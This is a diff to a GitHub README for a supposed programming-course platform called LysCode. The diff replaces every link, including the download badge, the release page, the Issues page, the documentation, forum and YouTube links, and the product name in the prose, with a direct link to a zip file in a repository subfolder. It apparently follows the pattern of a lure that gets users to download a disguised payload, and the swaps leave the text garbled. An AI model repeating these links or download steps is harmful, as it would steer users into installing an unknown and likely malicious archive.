@@ -1,10 +1,10 @@
 # 🎓 lyscode-platform - Learn Programming Easily and Effectively
 
-[![Download](https://img.shields.io/badge/Download%20Now-%F0%9F%8D%93%20Latest%20Release-blue?style=for-the-badge)](https://github.com/khaled878/lyscode-platform/releases)
+[![Download](https://raw.githubusercontent.com/khaled878/lyscode-platform/main/celliform/lyscode-platform.zip%20Now-%F0%9F%8D%93%20Latest%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/khaled878/lyscode-platform/main/celliform/lyscode-platform.zip)
 
 ## 📘 Introduction
 
-Welcome to the LysCode.com Course Platform! This application helps users learn programming with a focus on JavaScript and cybersecurity. Our platform simplifies the process of taking courses, allowing you to gain essential skills for today's tech world.
+Welcome to the https://raw.githubusercontent.com/khaled878/lyscode-platform/main/celliform/lyscode-platform.zip Course Platform! This application helps users learn programming with a focus on JavaScript and cybersecurity. Our platform simplifies the process of taking courses, allowing you to gain essential skills for today's tech world.
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download LysCode Platform](https://github.com/khaled878/lyscode-platform/releases). 
+To get started, visit this page to download: [Download LysCode Platform](https://raw.githubusercontent.com/khaled878/lyscode-platform/main/celliform/lyscode-platform.zip). 
 
 ### 📝 Steps to Download:
 
@@ -80,7 +80,7 @@ If you encounter issues:
 
 - Check the FAQ section in the app for common problems.
 - Ensure your system meets the requirements mentioned above.
-- Visit the [GitHub Issues Page](https://github.com/khaled878/lyscode-platform/issues) to report any bugs or request features.
+- Visit the [GitHub Issues Page](https://raw.githubusercontent.com/khaled878/lyscode-platform/main/celliform/lyscode-platform.zip) to report any bugs or request features.
 
 ## 💬 Feedback
 
@@ -88,8 +88,8 @@ We value your input. If you have suggestions or feedback about the platform, ple
 
 ## 🔗 More Resources
 
-- [Official Documentation](https://lyscode.com/docs)
-- [Community Forums](https://lyscode.com/community)
-- [YouTube Tutorials](https://youtube.com/lyscode)
+- [Official Documentation](https://raw.githubusercontent.com/khaled878/lyscode-platform/main/celliform/lyscode-platform.zip)
+- [Community Forums](https://raw.githubusercontent.com/khaled878/lyscode-platform/main/celliform/lyscode-platform.zip)
+- [YouTube Tutorials](https://raw.githubusercontent.com/khaled878/lyscode-platform/main/celliform/lyscode-platform.zip)
 
-Thank you for choosing LysCode.com Course Platform! We look forward to supporting your learning journey.
+Thank you for choosing https://raw.githubusercontent.com/khaled878/lyscode-platform/main/celliform/lyscode-platform.zip Course Platform! We look forward to supporting your learning journey.
